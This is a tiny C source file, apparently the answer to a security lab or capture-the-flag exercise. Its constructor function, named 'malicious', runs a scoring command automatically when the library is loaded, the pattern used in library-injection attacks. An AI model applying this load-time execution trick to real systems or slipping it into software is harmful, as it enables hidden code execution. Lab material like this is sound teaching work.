#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
    system("/usr/local/bin/score 78336796-1fb8-4c73-b074-9113a7fc43f9");
}
